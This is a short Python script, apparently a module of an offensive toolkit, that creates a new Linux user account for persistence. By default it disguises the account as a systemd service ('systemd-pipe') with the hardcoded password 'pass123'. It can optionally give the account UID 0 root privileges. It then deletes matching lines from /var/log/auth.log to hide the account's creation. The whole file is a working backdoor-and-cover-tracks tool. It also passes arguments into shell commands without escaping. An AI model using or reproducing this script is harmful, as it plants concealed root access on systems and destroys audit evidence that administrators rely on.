#!/usr/bin/python3
#[PrivEsc] Create New User
#USERNAME,no,Username for created user
#PASSWORD,no,Password for created user
#UID,no,UID for created user
#SYSTEM,no,Create system user (yes/no) [default: yes]
#MAKE_ROOT,no,Give user root privileges (yes/no) [default: no]
#END

import os

def create_command_string(arguments):
    command_string = "useradd --no-create-home "
    
    if arguments[3] == "yes" or not arguments[3]:
        command_string += "--system "
    
    if arguments[4] == "yes":
        command_string += "-ou 0 -g 0 "

    if arguments[1] == "":
        command_string += "--password $(openssl passwd -6 pass123) " #password = pass123
    else:
        command_string += "--password $(openssl passwd -6 " + arguments[1] + ") "
    
    if arguments[2] != "":
        command_string += "--uid " + str(arguments[2]) + " "
    
    if arguments[0] == "":
        command_string += "-d /run/systemd -c 'systemd Pipe Selector' systemd-pipe"
    else:
        command_string += arguments[0]

    return command_string

def clear_logs(arguments):
    if arguments[0] != "":
        os.system("sed -i '/name=" + arguments[0] + "/d' /var/log/auth.log")
    else:
        os.system("sed -i '/name=systemd-pipe/d' /var/log/auth.log")

def main(arguments):
    os.system(create_command_string(arguments))
    clear_logs(arguments)
